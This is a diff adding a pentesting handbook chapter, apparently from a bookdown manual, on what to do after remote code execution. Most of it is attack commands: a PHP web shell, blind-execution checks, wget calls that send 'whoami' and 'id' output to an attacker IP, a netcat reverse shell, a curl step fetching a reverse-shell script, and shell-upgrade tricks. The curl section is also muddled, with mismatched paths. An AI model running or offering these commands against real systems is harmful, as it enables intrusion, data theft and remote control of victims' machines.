@@ -1,0 +1,169 @@
+# (PART) Vuln exploit & Gaining Access{-}
+
+# Beyond Remote Code Execution {-}
+
+**Remote code execution** occurs after some vulnerabilities exploitation and allows users to execute
+operating system commands on a remote system. 
+
+You always have to be aware of command type execution language. Sometimes bash command are not working, so try with
+languages. If the website is in php try to call phpinfo(); for example. Then you will know that your remote code execution will
+look like system('whoami');
+
+## Checking if code execution occurs {-}
+
+Sometimes attacker don't realy know if remote code execution occurs because no direct output are visible
+to him. Here we will see some technics to know if code execution runs or not.
+
+### Time sleep technic {-}
+
+```bash
+GET /script.php?cmd=sleep+5&ok=ok HTTP/1.1
+```
+
+### Check network connectivity {-}
+
+Lets try to ping the attacker machine, attacker can use wireshark or tcpdump.
+
+On the attacker machine listen to icmp connection
+
+```bash
+tcpdump icmp
+```
+remote code execution ping
+
+```bash
+ping -c 5 <attacker ip>
+```
+
+### Use wget and netcat to execute command {-}
+
+1. listener (attacker)
+
+    ```bash
+    nc -nlvp 443
+    ```
+2. powned (victim)
+
+    ```bash
+    wget http://<pirate_ip>:443/`whoami`
+    ```
+
+> [ ! ] NOTE: for big files or also for php files use the | base64 command 
+> ```wget http://<pirate_ip>:443/`id|base64` ```
+
+
+## Visible remote code execution {-}
+
+**Visible remote code execution** can be performed with code looking like that:
+
+```php
+<?php
+echo "<html>";
+echo "<pre>";
+echo "<form method=GET><input type=text name=cmd style='width:400px;'>";
+echo "<input type=submit value=Execute style='height:34px;'></form>";
+$a = system($_GET["cmd"]);
+echo "</pre></html>";
+?>
+```
+
+When the remote code execution response is visible, there are some things to check:  
+
+- Which user serves the service  
+- Where  
+- Interesting files content  
+- Binaries  
+
+
+```bash
+ifconfig
+whoami
+id
+pwd
+cat /etc/passwd
+cat /etc/group
+which python
+which curl
+which nc
+which wget
+```
+
+## Gaining access throw remote code execution {-}
+
+### Listen and connection with netcat {-}
+
+**Netcat** also known as **nc** is a utility that allows to open TCP or UDP connections throw the network.
+
+How it work:
+
+1. listener (attacker)  
+
+    ```bash
+    nc -nlvp 443
+    ```
+
+1. powned (victim)  
+
+    ```bash
+    nc -e /bin/bash <pirate_ip> 443
+    ```
+
+### Connection with curl {-}
+
+1. attacker http server (attacker)  
+
+    ```bash
+    python -m http.server 9090
+    ```
+
+1. powned (victim)  
+
+    ```bash
+    mkdir /tmp/r
+    curl http://<pirate_ip>:9090/reverse_tcp_malicious.sh -o /tmp/r
+    chmod +x /tmp/r/reverse_tcp_malicious.sh
+    ```
+
+1. listener (attacker)  
+
+    ```bash
+    nc -nlvp 443
+    ```
+
+1. powned (victim)  
+
+    ```bash
+    /tmp/r
+    ```
+
+
+
+# Spawning a terminal from a shell {-}
+
+After a successfull connection it's important to prepare the shell to be able to work confortably.
+The following command are always the same:
+
+```bash
+script /dev/null -c bash
+^Z
+stty raw -echo; fg
+-> reset
+-> xterm
+export TERM=xterm
+export SHELL=bash
+
+stty -a
+
+stty rows <rownb> columns <colnb>
+```
+
+> [ ! ] Note: stty -a is done in the attacker shell to know rows and columns size
+
+
+
+
+
+
+
+
+
